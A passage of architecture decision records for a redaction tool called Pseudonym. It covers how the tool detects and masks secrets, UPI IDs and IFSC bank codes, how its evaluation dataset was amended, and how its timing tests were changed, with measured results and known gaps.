PAN, IFSC or mobile; a key ending in an IFSC or IP address, or three
letters, a hyphen and a mobile), `joined-digits` 30 (15 digits joined by a
bracket or `+`), `short-id` 459. Three new labelled types, `PASSPORT`,
`VOTER` and `DOB`, 153 each, only in the block, with and without a
keyword, among lookalikes of the same shape (`INV`/`ORD`/`TXN`/`REF` + 7
digits, a letter + 7 digits, `T` + 7 digits, old dates). New slot
variants: `EMAIL.pan|ifsc|mobile`, `SECRET.ifsc-tail|ip-tail|mobile-tail`,
`UPI.mobile-name`. The scorer tallies values by shape (generated set only:
a held-out case's tags are its author's text and are never reported); the
baseline keeps the per-shape redacted count as a threshold like the
per-type ones, and the README block shows a per-shape table (`main` for
the usual layouts). A type a stored baseline predates reads as an empty
row. The lint gains `typed-id`: a typed passport- or voter-ID-shaped code
is refused like a typed PAN (the held-out file passes it unchanged).
Accepted as a changed dataset with the detectors unchanged; the two worse
over-redaction counts (PAN 10 to 11, IP 53 to 61) come from the block's
filler sentences, which reuse the main lookalikes.

**Amendment (2026-10-01, the user's note on step 0): the shape block is
reported apart.** The headline per-type table (run output, baseline,
README) is the 500 main cases only, so the hard shapes never read as a drop
in overall quality; the shape block is scored on its own, one row per
shape, below it. Each shape row keeps three thresholds, as the type rows
do: redacted, redacted with the right type, over-redactions (the block's
over-redactions by lookalike kind are printed too). There is no `main` row
any more. Accepted as a changed dataset: the headline counts are again the
500-case ones (PAN 10 and IP 53 over-redactions, as before step 0), and
the shape rows' right-type and over-redaction counts are recorded for the
first time.

**Amendment (2026-10-02, Phase 5d part 3): `in-markup`.** For the echo
measurement (ADR-033) the shape block gains `in-markup`, after the contact
sheets so that every earlier case renders as before (the 1,136 earlier
cases hash identically to HEAD): 90 values, one per ticket, 9 in each of
ten places: a URL's query (`?id=`), a URL's path, a markdown link's text,
a link's target (`mailto:`, `tel:`, a URL), an image URL, `mailto:` in
prose, a quoted HTML attribute (`href="mailto:…"`, `value="…"`,
`data-pan='…'`), a table cell's text, a reference definition, and an
`<img src="…">`. Types are those people put there: EMAIL 40, PHONE 21, PAN
11, UPI 10, AADHAAR 8. Accepted as a changed dataset with the detectors
unchanged (history note in `eval/baseline.json`): 90/90 redacted, all with
the right type, 8 over-redactions, all on labelled lookalikes in the
tickets' filler sentences. The scoring cannot see one thing this shape
shows: a detection that reaches far past its value still counts as right
if it touches a value of its type (bug-log 49).

**Amendment (2026-10-02, Phase 5d part 5): the four format gaps stay
gaps.** Numbers written as words, letters standing in for digits, postal
addresses and vehicle numbers cannot be written as cases (no slot type or
modifier generates them, and a typed one could be somebody's). The
approved plan keeps them as documented gaps instead of extending the
format: `eval/HELD-OUT-FORMAT.md` ("Not expressible yet"), the README's
known gaps and threat model. None is detected (checked on one sentence of
each shape). A probe with generated values and one digit written as a
letter (O, l, S, B for 0, 1, 5, 8): never recognised as its type; replaced
whole by the safety net when 9 or more digits are left in one stretch
(Aadhaar 208 of 494, cards 403 of 500, mobiles 0 of 489).

---

<a id="adr-022"></a>

## ADR-022: Secret detection — known formats and keyword assignment; the safety net takes the whole token

**Context:** ADR-021 (item 7, approved 2026-09-30) fixed the approach for
secrets: known formats plus keyword assignment, no entropy scanning. This
records what that became in `src/detection/secret.ts`, the choices made
inside that scope, and one change outside the detector that the user's
instruction required ("the partial secret leaks from the 5a baseline
fixed"). The 5a baseline had 0 of 153 generated secrets redacted and 11
partly redacted: digits cut out of Slack tokens and hexadecimal tokens by
the number detectors.

**Decision:**

1. **Known formats** (validated, ADR-003): a provider's published prefix,
   then its alphabet, at least a minimum length, taken to the end of the
   alphabet's run (a key longer than its format goes whole). OpenAI,
   Anthropic and other `sk-` keys (20+ characters, with a digit or a
   capital, so that `sk-learn-based-…` is not a key), GitHub (`ghp_`,
   `gho_`, `ghu_`, `ghs_`, `ghr_` + 36; `github_pat_`), GitLab (`glpat-`),
   AWS access key IDs (`AKIA`, `ASIA` + 16), Stripe (`sk_`/`rk_` +
   `live`/`test`/`prod`; `whsec_`), Razorpay (`rzp_live_`/`rzp_test_` +
   14), Slack (`xox?-`, `xapp-`), Google (`AIza` + 35), npm, Hugging Face,
   JSON Web Tokens (two parts starting `eyJ`, signature optional), and PEM
   private-key blocks (to the END line, or to the end of the text if there
   is none). Sources: each provider's documentation of its key format,
   cross-checked against the gitleaks default rules on 2026-09-30 (which
   have no Razorpay rule; that one is from Razorpay's documentation). The
   detector's list is its own, separate from the generator's (ADR-008). A
   format may not start glued to a letter, digit, mark or underscore.
2. **Keyword assignment** (unvalidated; the candidate carries
   `context: true` itself, since the keyword is part of its pattern): a
   credential word, then on the same line an optional linking word (is,
   was, hai, tha, है, था, a spaced dash) and an optional `:` or `=`, then
   the value: the text up to the next blank, without closing punctuation
   (`. , ; : ) ] } > " '` and the danda; `!` and `?` are kept). Words:
   password, passwd, pwd, passphrase, secret, token, bearer, api
   key/secret/token, access key, secret key, private key, auth token (with
   a space, `_` or `-`; and as part of an identifier: `DB_PASSWORD`,
   `aws_secret_access_key`), पासवर्ड, टोकन; and for numeric codes: OTP,
   PIN, mPIN, CVV, CVC, passcode, ओटीपी, पिन.
3. **When a value is taken.** "My password is wrong" has the shape of "my
   password is hunter2", so the value must show it is one:
   - after `=`: always;
   - in quotes: always;
   - after `:` when it is the last thing on its line;
   - otherwise only if it looks like a secret: 6 or more characters with
     a digit or one of `@ # $ % ^ & * ! + = ~ | < >`;
   - after a code word: 3 to 8 digits.
4. **No third way.** No entropy scanning (ADR-021). A value with no known
   prefix and no keyword directly before it is not found.
5. **Value key** (ADR-013): the secret exactly as written after
   normalisation, case kept. Two passwords that differ in case are two
   passwords.
6. **Priority** (ADR-003): `… > EMAIL > SECRET > NUMBER`. The first rule
   still decides most cases: a known format is validated and long, so it
   beats a phone number or Aadhaar found inside it (the 5a baseline had
   one of each inside Slack tokens).
7. **The safety net takes the whole token (amends ADR-011).** A NUMBER
   found inside a longer token is widened over the letters, digits, marks
   and underscores glued to it on both sides, up to anything a real
   detection claimed; two long stretches in one token are one detection.
   Before, nine digits were cut out of a 40-character hexadecimal token
   and the other 31 characters were sent: part of a secret is a leak, and
   the scorer counts it as one. This is what fixes the partial leak for a
   token with no keyword.

**Options considered and rejected:**

- _Entropy scanning_ (flag any long random-looking string). Rejected in
  ADR-021: it needs a threshold tuned on data we do not have, it fires on
  hashes, IDs and base64 images, and its misses cannot be explained in one
  sentence. The two ways above can.
- _Keyword assignment without conditions_ (take whatever follows
  "password"). It would replace "wrong", "reset" and "not" in ordinary
  sentences: the model could no longer read a complaint about a password.
- _Conditions everywhere_ (require a secret-looking value even after `=`
  or in quotes). It would miss `password=sunshine` and
  `"password": "sunshine"`, the two forms in which a letters-only password
  is unmistakable.
- _A "login" keyword_, to catch the generated sentences "I tried logging
  in with …" and "Login … se nahi ho raha". What follows "login with" is
  more often a user name, a phone number or an app, and adding it would
  have been fitting the detector to two of the generator's own sentences.
  Those sentences exist to measure the no-keyword case; they stay misses.
- _Cutting the value at `,` `;` or `&`._ A password may contain them, and
  a value that runs too far costs nothing (it is restored as it was); one
  cut short leaks its tail.
- _Leaving the safety net as it was and adding a "long hexadecimal
  string" format._ A 40-character hexadecimal string is as likely a commit
  id as a token; as a format it would be entropy scanning by another name.
  The whole-token rule needs no such judgement: the net had already
  decided to redact part of the token.

**Choices made inside the approved scope (to confirm or reverse):**

- _Numeric codes (OTP, PIN, CVV) count as secrets._ They are the secrets
  people most often type into a support chat. Neither dataset has them as
  values (the generated set has a 6-digit `NOT.otp` lookalike in sentences
  without the word OTP), so their detection is tested but not measured.
- _`:` + last on the line takes any value._ `Password: sunshine` in a
  pasted record is caught; the cost is that a status word alone after a
  colon (`Token: expired`) is replaced too. Pinned by a test as an
  accepted cost.
- _The whole-token rule_ (item 7) changes ADR-011 for every glued number,
  not only for secrets: `UID234567890123` is now replaced whole, where
  `UID` used to stay. Glued words go with the number
  (`number9876543210hai`); hyphens, dots and other joiners still end a
  token.

**Measured (2026-09-30, `npm run eval`):**

|                                      | Before (5a)      | After             |
| ------------------------------------ | ---------------- | ----------------- |
| Generated, SECRET redacted           | 0/153, 11 partly | 144/153, 0 partly |
| Generated, SECRET right type         | 0/153            | 143/153           |
| Generated, SECRET precision          | -                | 143/143           |
| Generated, over-redactions by SECRET | -                | 0                 |
| Held-out, SECRET redacted            | 0/5              | 5/5               |

By kind (generated set): all 125 secrets in the nine known formats are
redacted as SECRET. Passwords 10 of 15: the 5 missed are in the two
sentences with no keyword. Bare hexadecimal tokens 9 of 13: 8 by their
keyword, 1 by the safety net (the whole token, as NUMBER, which is why
"redacted" is one more than "right type"), 4 missed in "I pasted … into
the chat by mistake" with no long digit stretch. Other rows moved only
where a secret used to be cut up: AADHAAR and CARD each have one detection
fewer (each was a piece of a Slack token), NUMBER has nine fewer, and one
NUMBER over-redaction goes (112 to 111: a 16-digit transaction id that
follows a key ending in a digit is now inside the SECRET detection,
through the digit-run widening noted below).

**Consequences and known limits:**

- Missed by design: a bare random string; a letters-only password in a
  sentence; a value that does not directly follow its keyword ("the
  password for the portal is …", "… is my password"); a header line with
  the values on the next line; a passphrase after its first word;
  credentials inside a URL (`scheme://user:password@host`).
- False positives in prose are **not measured**: the generated set has no
  sentence that uses a credential word without a value. The unit tests pin
  27 such sentences in which nothing is taken. Adding such sentences to
  the generator changes the dataset (a note in the baseline history):
  proposed for 5c.
- _Open (5c, the ADR-003 containing-span question):_ a keyword-assigned
  value is unvalidated, so a validated value inside it wins the overlap
  and the rest of the secret is dropped, not redacted:
  `token: abc-<mobile>` would leave `abc-`. Not seen in the generated set
  (a password there never contains a separate valid number).
- _Open (5c, widening merges neighbours, ADR-010):_ a secret that ends in
  a digit and is followed by a space and a number is widened over that
  number (one case in the generated set, the transaction id above). It
  over-redacts, and the secret's placeholder then depends on its
  neighbour.
- Everything in the detector is linear in the text: a known format cannot
  start inside a longer token, a JWT cannot start after `-` or `.`, and a
  keyword's value is judged from facts worked out once per stretch of
  non-blank text. 16 growth-ratio tests.
- `[SECRET_N]` is a new placeholder namespace. Like every tag but AADHAAR
  and LITERAL it has no bare-space form (`Secret 1` is ordinary English);
  `SECRET_1` typed by a user still reserves its index (ADR-002).
  `MAX_HELD_BACK` stays 15.
- The no-leak test now plants secrets in the nine known formats, plain and
  disguised; with the known formats switched off it fails naming SECRET.

---

<a id="adr-023"></a>

## ADR-023: Timing tests climb to their size and fail fast

**Context:** bug-log 24. A linear-time test compares the time of the same
work on an input and on one four times as long (`growthRatio`, bug-logs 9
and 20). Its size is chosen for correct code: 250,000 characters for the
safety net, whose large input is 1,000,000. On a quadratic regression one
run at that size takes about an hour, and a test timeout cannot interrupt
a synchronous call, so four Phase 5b mutations (S21, N2, N5, N6) hung the
run instead of failing a named test. The ratio the tests look for is
already there at 8,000 characters in a fifth of a second. Proposed in
bug-log 24 for 5d; brought forward by the user (2026-10-01), before UPI.

**Options considered:**

- _Smaller sizes for every test._ Faster to fail, but correct code below
  about 2 ms per run gives ratios decided by noise (bug-log 20), and the
  sizes were chosen to stay above that.
- _A time budget inside the helper_ ("stop if a run takes over N s").
  That is a wall-clock limit again, which bug 9 removed because it fails on
  a slow machine.
- **Climb from a small size** (chosen, as proposed): the same comparison,
  made at a series of sizes, stopping at the first one that shows the
  problem clearly.

**Decision:**

- `growthRatio(make, n, work)` keeps its signature; no caller changes. It
  compares each size with the next one up: n / 4^k with n / 4^(k-1), ...,
  n with 4n, starting at the smallest n / 4^k that is at least
  `SMALLEST_SIZE` (100, in whatever unit `make` takes).
- A step below `n` is **judged** only when its smaller input takes at least
  `MEASURABLE_MS` (2 ms), the level below which noise decides the ratio
  (the helper's own guidance since bug 9). A judged step at or over 8 is
  measured again as before (bug 20: up to 3 times, smallest kept); if it
  stays at or over 8, the climb **stops and returns it**, and the test
  fails on its assertion, with its name.
- The last step, `n` against 4n, is always judged: a passing test ends
  with the same measurement it made before.

**Consequences:**

- For quadratic code, the first judged step's smaller run is under 16 × 2
  ms (the step before it was under 2 ms, and each step costs 16 times
  more), so a failing test takes seconds whatever `n` is. The helper's
  own test gives a quadratic function n = 1,000,000 and a `make` that
  refuses any size over 250,000: it fails the work in 2.5 to 3.3 s,
  stopping at 3,906 → 15,625 characters.
- Linear code is too fast to judge until close to `n`; the climb below
  `n` costs about a third more work per test (1/4 + 1/16 + …).
- More steps are judged than before, so there are more chances of a false
  "too high". Measured over 8 full runs and 2 under coverage (testing
  guide): 1,800 steps, 13 first ratios at or over 8, every one cleared on
  a second or third measurement.
- What it does not catch fast: code that is linear at small sizes and
  becomes quadratic only beyond them. The climb then reaches `n` and
  behaves as before: no faster, and no worse.
- Not changed: running the timing tests in parallel with the rest of the
  suite, which still makes them fail under heavy deliberate load (bug-log
  21, "also seen"). That is the other half of the 5d work before CI.

---

<a id="adr-024"></a>

## ADR-024: UPI detection — known handles validated, others only with a keyword

**Context:** Phase 5b, second detector (ADR-021 item 7). The approved design
(user, Phase 5 plan): a UPI ID is `name@handle`; **validated** when the
handle is on a hand-written list of known PSP handles; **unvalidated**
otherwise, accepted only with a keyword such as UPI, VPA, GPay or PhonePe
(ADR-010). The 5a baseline had 0 of 153 generated UPI IDs redacted and
38 partly redacted: in every `<mobile>@<handle>` the safety net took the
ten digits and the `@handle` was sent. This records what the design became
in `src/detection/upi.ts` and the choices made inside it.

**Decision:**

1. **Shape.** Name: one or more of `A-Za-z0-9 . - _` (what NPCI allows),
   starting where no such character precedes it (the email detector's
   ReDoS guard: a long token is scanned once), with at least one letter or
   digit. Then `@`, then the handle: a letter, then letters and digits (a
   price written `2kg@40` is not an ID). Case-insensitive. Runs on
   normalised text, so full-width forms, invisible characters and other
   scripts' digits are handled as for every other type.
2. **Validated** when the handle, lower-cased, is in `UPI_HANDLES` (51
   handles; **corrected 2026-10-02 from "54", which was never the list's
   size, bug-log 52**: Google Pay's four, PhonePe's three, Paytm's five, Amazon Pay's
   three, BHIM, WhatsApp's four, other apps, banks' own). No complete
   official list could be read on 2026-10-01 (NPCI's app pages are built
   by script and came back empty); the sources are the handles given in
   Wikipedia's "List of UPI Apps" and in the VPA guides of Razorpay,
   ClearTax and Bajaj Finserv, plus banks' own handles. The detector's
   list is its own (ADR-008); every one of the generator's ten handles is
   on it, as expected for the ten most common handles, so the generated
   set cannot measure the list's coverage.
3. **Unvalidated** otherwise, accepted only with a UPI keyword within 40
   characters (`context.ts`): upi, vpa, bhim, gpay, google pay, phonepe,
   paytm, amazon pay, यूपीआई.
4. **Email wins where it applies.** If the text after the `@` is an email
   domain by the email detector's own pattern (`EMAIL_DOMAIN`, now
   exported from `email.ts` and used by both), the UPI detector yields
   nothing: `<name>@okaxis.com` is one email. A UPI ID has no top-level
   domain, so the email pattern never matches one. The two detectors
   therefore never claim the same text, and the overlap rule is never
   asked to choose between them.
5. **A mobile number before the `@` is part of the ID.** The digit
   detectors already refuse digits glued to `@` (ADR-003 concern, Phase
   1b), so `<mobile>@ybl` has no PHONE candidate at all; the safety net
   no longer takes its digits because the UPI detection claims them. A
   mobile written in groups (`98765 43210@…`) is covered whole by the
   existing widening to digit runs.
6. **Priority** (ADR-003): `AADHAAR > CARD > PAN > PHONE > UPI > EMAIL >
SECRET > NUMBER`, where ADR-003 always listed it (IFSC will go between
   PAN and PHONE). Placeholder `[UPI_1]`. Restoration needs no change: the
   grammar is built from `DETECTION_TYPES`, and UPI, like every tag but
   AADHAAR and LITERAL, is restored from `[UPI_1]`, `UPI_1` and `Upi_1`,
   never from the bare-space form.
7. **Value key** (ADR-013): lower-cased, as for email. Payment apps treat
   a UPI ID without regard to case, so `<NAME>@OKAXIS` and
   `<name>@okaxis` in one request are one placeholder, restored as first
   written.
8. **Test data** (ADR-021 item 3, ADR-009): no UPI ID at a known handle is
   typed into any file. Tests put theirs together at run time from a
   generated name and a handle, and `repo-hygiene.test.ts` runs the UPI
   detector over every scanned file (it caught one on its first run:
   bug-log 26).

**The containing-span question (ADR-003 concern): not settled, sidestepped
for the common shape.** For `<mobile>@<handle>` it never arises: there is
no PHONE candidate inside a UPI ID (item 5), so there is nothing for rule 1
to prefer. Had there been one, a known handle would still win: both are
validated and the UPI span is longer (rule 2). The question remains for
one shape, pinned by a test as a known limit: a mobile, a dot and a name
at an **unknown** handle with a keyword (`UPI: <mobile>.<name>@<unknown>`).
The mobile is a validated PHONE (a dot is not glue), the UPI ID is
unvalidated, rule 1 picks the phone, and `.<name>@<unknown>` is sent. The
same question is open for keyword-assigned secrets (ADR-022). It stays in
5c; UPI does not change the answer.

**Options considered and rejected:**

- _Any `<mobile>@<letters>` counts as validated, whatever the handle._ It
  would close the gap below, but it is not the approved design, and
  `<digits>@<word>` also appears in things that are not payment IDs. Left
  for the user to decide if the gap matters.
- _"Phone pe" as a keyword_ (PhonePe written as two words). In Hinglish it
  also means "on the phone", which is common in exactly the messages
  Pseudonym sees. Pinned by a test.
- _"Refund" as a keyword._ Three of the generator's sentences say "refund
  to …" with no other keyword, and the four missed generated IDs are all
  in such sentences. Adding the word would be fitting the detector to the
  generator's own templates (the same reasoning as "login" in ADR-022);
  "refund" also appears near card numbers and account numbers.
- _Letting the overlap rule choose between UPI and email._ A validated UPI
  ID would then beat the longer, unvalidated email and send the rest of
  its domain: `<name>@paytm.com` would leave `.com`. Giving way by the
  email detector's own pattern means the two cannot disagree.
- _The email pattern's local-part characters for the name_ (`+ = ? / &`
  and the rest). In a payment link (`upi://pay?pa=<id>&pn=…`) the name
  would run back over `pay?pa=` and the other parameters. The NPCI
  characters stop at `=`.

**Measured (2026-10-01, `npm run eval`; the README block shows the UTC
date, 2026-09-30):**

|                                   | Before (5a)      | After                               |
| --------------------------------- | ---------------- | ----------------------------------- |
| Generated, UPI redacted           | 0/153, 38 partly | 149/153, 0 partly                   |
| Generated, UPI right type         | 0/153            | 149/153                             |
| Generated, UPI precision          | -                | 149/149                             |
| Generated, over-redactions by UPI | -                | 0                                   |
| Generated, NUMBER detections      | 301              | 263 (the 38 mobiles inside UPI IDs) |
| Held-out, UPI redacted            | 0/3, 1 partly    | 3/3                                 |

The four generated misses are all a name at an unknown handle with no
keyword within 40 characters (checked by a script that printed case id,
known-handle and keyword flags only): the designed limit. No other count
moved. The held-out numbers were read once, after the detector and its
tests were final.

**Consequences and known limits:**

- A name at an unknown handle with no keyword is missed.
- A mobile at an unknown handle with no keyword: the safety net takes the
  digits and the `@handle` is sent (it names only the app or bank).
  Pinned by a test.
- A mobile, a dot and a name at an unknown handle, even with a keyword:
  only the phone is redacted (the containing-span limit above).
- A UPI ID glued to the next sentence (`<id>.In future…`) reads as an
  email: covered whole, typed EMAIL. Pinned by a test.
- In a payment link only the ID is taken: the payee name (`pn=`) waits for
  PERSON detection (Phase 6).
- False positives in prose are not measured: neither dataset has
  `word@word` text that is not a UPI ID (npm's `pkg@latest`, `user@host`).
  With a known handle it would be redacted (an over-redaction, restored as
  written); with an unknown one only near a UPI keyword.
- ADR-013's literal-overlap filter stays unreachable: a UPI name cannot
  contain `[` or `]`, so no UPI detection can overlap `[TYPE_N]`.

  > **Correction (2026-10-03, bug-log 58):** the conclusion is wrong. A
  > UPI detection itself still never overlaps a literal (probed with
  > `[PAN_1]` glued before and after a UPI ID), but the filter is reachable:
  > a UPI ID whose name starts with a digit right after `[PAN_1]` makes the
  > safety net take the literal's `1` as digits joined to it (ADR-029), and
  > that NUMBER overlaps the literal; keyword secrets, emails and glued
  > numbers reach it too. The overlapping detection was dropped whole and
  > its value sent. See bug-log 58 and [ADR-037](#adr-037).
  > **Fixed the same day:** such a detection is now cut around the literal,
  > never dropped (bug-log 58).

**Amendment to ADR-003 (2026-10-01):** "validated" for UPI means a known
handle (item 2). UPI takes its listed place between PHONE and EMAIL.

---

<a id="adr-025"></a>

## ADR-025: IFSC detection — known bank codes validated, others only with a keyword

**Context:** Phase 5b, third detector (ADR-021 item 7). The approved design
(user, Phase 5 plan): an IFSC is 4 letters, a `0`, then 6 characters;
**validated** when the 4 letters are a known bank code from a hand-written
list; **unvalidated** otherwise, accepted only with a keyword such as IFSC,
NEFT, RTGS or "branch" (ADR-010). The user asked for four things to be
settled here: where the bank-code list comes from (RBI preferred), case
handling decided on principle, the overlaps with PAN, NUMBER, SECRET and
UPI, and the false positives on IFSC lookalikes, measured on the generated
set. Before this, 0 of 153 generated IFSCs were redacted: an IFSC has 7
digits, below the safety net's 9.

An IFSC names a bank branch, not a person, and RBI publishes every one.
It is redacted because it narrows down where a person banks and is almost
always written next to their account number; it is not personal on its
own. So typed IFSCs may appear in tests and in the held-out file
(`HELD-OUT-FORMAT.md` already allowed `{{IFSC=…}}`), and
`repo-hygiene.test.ts` does not look for them.

**Decision:**

1. **Shape.** `[A-Za-z]{4}0[A-Za-z0-9]{6}`: the fifth character must be
   the digit zero, and the branch part may hold letters (30,423 of the
   183,214 branch codes in the source below do, e.g. co-operative banks'
   sub-member codes). Not glued to a letter, digit, combining mark or
   underscore on either side (as PAN), **nor to `@`** (item 5). Runs on
   normalised text, so full-width letters, other scripts' digits and
   invisible characters are handled as for every other type.
2. **The bank-code list: 260 codes, from RBI's list via a published
   copy.** RBI's page "List of NEFT enabled bank Branches (Bank-wise
   IFSC)" (`rbi.org.in/Scripts/bs_viewcontent.aspx?Id=2009`, updated
   2026-09-15) could be read on 2026-10-01: 234 banks, one Excel file
   each. **The Excel files could not be downloaded**: every request
   returned a bot-protection script page instead of the file, and I did
   not try to get around it. The page itself gives bank names, not codes.
   So the codes come from Razorpay's open-source copy of RBI's files
   (`github.com/razorpay/ifsc`, MIT licence, `src/IFSC.json`, last changed
   2026-09-01): the 260 four-letter keys that have at least one branch.
   Its `banknames.json` has 1,511 codes, but the other 1,251 have no
   branch in RBI's list (payment-system participants and sub-members that
   use a sponsor bank's code), so an IFSC can never start with them.
   Cross-check against RBI's own page: 179 of RBI's 234 bank names match a
   name in the dataset exactly after removing punctuation, "Ltd" and
   "The"; every one of the rest that I looked at is the same bank spelled
   differently (IDBI is `IBKL`, DBS is `DBSS`, CSB is `CSBK`, HSBC,
   Emirates NBD is `EBIL`). I did not match all 55 by hand, so "the 260 are
   exactly RBI's list" is not claimed, only "a copy of RBI's files, checked
   against RBI's list of names". Merged banks that still have one branch
   in the list (Allahabad, Andhra, Corporation, Oriental, Syndicate,
   United, Vijaya, Dena) are kept: their old codes are still written in
   old records. The list is typed into `src/detection/ifsc.ts` as data
   with its source; the dataset itself is not a dependency and is not in
   the repo. The generator's list (11 large banks) is its own (ADR-008);
   all 11 are on the detector's.
3. **Unvalidated** otherwise, accepted only with an IFSC keyword within 40
   characters (`context.ts`): ifsc, ifs code, neft, rtgs, imps, branch,
   आईएफएससी, शाखा ("branch"). The words name the code or the transfers
   that need one.
4. **Case: any case, decided on principle.** An IFSC is defined in
   capitals, but `sbin0001234` is the same code, and PAN (the closest
   type), email and UPI already match in any case. Failing closed means a
   lower-case IFSC is still redacted. The bank code is looked up in
   capitals, so case never changes validation, and the value key is the
   code in capitals (like PAN): `SBIN0001234` and `sbin0001234` in one
   request are one `[IFSC_1]`, restored as first written. Cost: a
   lower-case or mixed-case token of the same shape (`abcd0123456` in a
   URL or a hash) is a candidate too. It is accepted only with a bank code
   on the list or a keyword, and the chance that four random letters are
   on the list is 260 in 456,976 (0.06%). Measured only in part: 12 of the
   generated set's 153 IFSCs are lower case (all found), but its
   lookalikes are all upper case, so the cost is not measured. Decided before any held-out
   number was seen, and not revisited after.
5. **`@` is glue** (bug-log 27): an IFSC-shaped stretch touching `@` is
   part of an email address or a UPI ID and is left to those detectors.
   The same rule the digit detectors have had since Phase 1b; PAN gets it
   in the same change.
6. **Priority** (ADR-003): `AADHAAR > CARD > PAN > IFSC > PHONE > UPI >
EMAIL > SECRET > NUMBER`, where ADR-003 always listed it. Placeholder
   `[IFSC_1]`. Restoration needs no change: the grammar is built from
   `DETECTION_TYPES`; IFSC, like every tag but AADHAAR and LITERAL, is
   restored from `[IFSC_1]`, `IFSC_1` and `Ifsc_1`, never from the
   bare-space form. `MAX_HELD_BACK` is unchanged (`IFSC` is shorter than
   `AADHAAR`).

**Overlaps, with examples** (each pinned in `ifsc.test.ts`, "IFSC next to
the other types"):

- _PAN_ (`AAAPA9999A` shape): no text can be both. An IFSC has `0` where a
  PAN has its fifth letter, they differ in length, and both refuse to be
  glued to letters or digits, so neither can sit inside the other. A PAN
  and an IFSC side by side are one of each. The priority order therefore
  never decides between them.
- _NUMBER_: an IFSC holds 7 digits (the `0` and the branch), below the
  safety net's 9, so nothing else claims a bare IFSC. An account number
  after a slash or `, A/c ` is its own NUMBER. Digits joined to the
  branch by a space or dot (`SBIN0001234 1234 5678 9012`) are taken into
  the IFSC detection by the widening to digit runs (ADR-010): an
  over-redaction (one placeholder for both), never a leak. The open
  "widening merges neighbours" issue (5c) covers it.
- _SECRET_: `password: SBIN0001234` gives a keyword-assigned SECRET and a
  validated IFSC over the same span; the IFSC wins (rule 1) and the value
  is redacted either way. With an unknown bank code and no IFSC keyword it
  is the SECRET, whole. `api_key=SBIN0001234-x7`: the IFSC wins over the
  longer unvalidated secret and `-x7` is sent. That is the open ADR-003
  containing-span question, already recorded for secrets (ADR-022); a
  known-limit test pins it.
- _UPI_: `<ifsc>@<known handle>` is one UPI ID (item 5). An IFSC-shaped
  handle (`name@sbin0001234`) is never an IFSC; it is a UPI ID at an
  unknown handle, found only with a UPI keyword.
- _EMAIL_: `<ifsc>@example.com` and `x.<ifsc>@example.com` are one email.
  `<ifsc>.x@example.com` keeps only the IFSC (containing span, 5c;
  pinned).
- _AADHAAR, CARD, PHONE_: 7 digits glued to letters; the digit detectors
  never see them.

**Lookalikes added to the generated set.** It had none of IFSC's shape, so
the false-positive cost could not be measured. Three `NOT` kinds were
added to `eval/generate.ts`, each a code people really paste:
`NOT.product-code` (`????0######`: four random capitals, a zero, six
digits, the exact shape with a bank code that is almost never on the
list), `NOT.batch` (`????#######`: the fifth character is never a zero)
and `NOT.invoice-no` (`INV000#####`: three letters, not four). Adding
kinds changes which lookalike each pick lands on, and cases that picked a
different one render their other values differently too. So the change
was measured in two steps on purpose: first the new dataset with the
detectors unchanged (recorded with `--accept`; every count that moved is
the dataset's doing), then the detector on that same dataset.

**Measured (2026-10-01, `npm run eval`; the README block's date is UTC):**

|                                    | Dataset step (no detector) | With the IFSC detector                                               |
| ---------------------------------- | -------------------------- | -------------------------------------------------------------------- |
| Generated, IFSC redacted           | 0/153                      | 153/153, 0 partly                                                    |
| Generated, IFSC right type         | 0/153                      | 153/153                                                              |
| Generated, IFSC precision          | -                          | 153/159 (96.2%)                                                      |
| Generated, over-redactions by IFSC | -                          | 6                                                                    |
| `NOT.product-code` redacted        | 0/30                       | 6/30 (all unvalidated, each within 40 characters of an IFSC keyword) |
| `NOT.batch` redacted               | 0/32                       | 0/32                                                                 |
| `NOT.invoice-no` redacted          | 0/23                       | 0/23                                                                 |
| Held-out, IFSC redacted            | 0/3                        | 3/3                                                                  |

No other count moved between the two columns. None of the 30 product
codes had a bank code on the list; all 30 were candidates, and the 6 that
were redacted are the ones with a keyword nearby, mostly in pasted
records that also have an `IFSC:` field. That is the price ADR-010 sets
for an unvalidated shape, and it was not tuned away: shrinking the window
or dropping "branch" would be fitting the detector to the generator's own
templates.

**What the generated set cannot show:** every one of its IFSC sentences
and record fields has a keyword, so the 26 generated IFSCs
with an unknown bank code are all found; an unknown-bank IFSC with no
keyword (a miss by design) is never tested there. Only the unit tests
cover it. **[Note 2026-10-01, ADR-026: no longer true.** The IP part's
two dataset steps re-rendered the set: one unknown-bank IFSC now sits in
a pasted header-and-row record whose `IFSC` column name is more than 40
characters away, and is missed by design (152/153). The generated set
now shows the limit once.**]**

**When the held-out number was seen:** the first evaluation run with the
detector printed the held-out change (`held-out IFSC: redacted 0 -> 3`)
in its list of moved counts, before the unit tests were written. No
change to the detector was made after that; the tests, the mutation
checks and one test-size fix (bug-log 28) followed, none touching
`ifsc.ts`'s behaviour. Until a detector is final, a run's list of moved
counts should be read for the generated set only.

**Options considered and rejected:**

- _A short list of large banks (about 30)._ Fewer codes, no measurable
  gain: 260 codes cover 0.06% of four-letter prefixes. Small banks' and
  co-operative banks' customers have the same claim to privacy.
- _All 1,511 codes in `banknames.json`._ 1,251 of them issue no IFSC, so
  they could only add false positives.
- _"bank" as a keyword._ It names neither the code nor a transfer that
  needs one, and it is in almost every message Pseudonym sees near an
  account number, a card or a UPI ID. Pinned by a test.
- _Capitals only._ It would miss the lower-case IFSC the generated set
  already labels, and treat the same code two ways.
- _A letter O for the zero_ (`SBINO001234`), a common typing slip, and _a
  space or hyphen after the bank code_ (`SBIN 0001234`). Both would widen
  the approved shape; the first is the 5d "letters standing in for
  digits" gap, the second a new layout. Not detected; known limits,
  pinned by tests, in the README.

**Consequences and known limits:**

- An IFSC with an unknown bank code and no keyword is missed.
- `SBINO001234` and `SBIN 0001234` are missed.
- A value made of an IFSC, a dot or hyphen and more, inside an email
  address or a keyword-assigned secret: only the IFSC is redacted
  (containing span, 5c).
- Digits joined to an IFSC by a space or dot share its placeholder
  (widening, 5c).
- The list goes stale as banks merge and new ones open: a new bank's
  codes are found only with a keyword until the list is updated. Nothing
  measures that.
- ADR-013's literal-overlap filter stays unreachable: an IFSC cannot
  contain `[` or `]`.

  > **Correction (2026-10-03, bug-log 58):** the conclusion is wrong. An
  > IFSC detection itself still never overlaps a literal (probed with
  > `[PAN_1]` glued before and after a code, and after a keyword), but the
  > filter is reachable through other types: the safety net's joined
  > digits, keyword secrets, emails and glued numbers. The overlapping
  > detection was dropped whole and its value sent. See bug-log 58 and
  > [ADR-037](#adr-037).
  > **Fixed the same day:** such a detection is now cut around the literal,
  > never dropped (bug-log 58).

---

<a id="adr-026"></a>

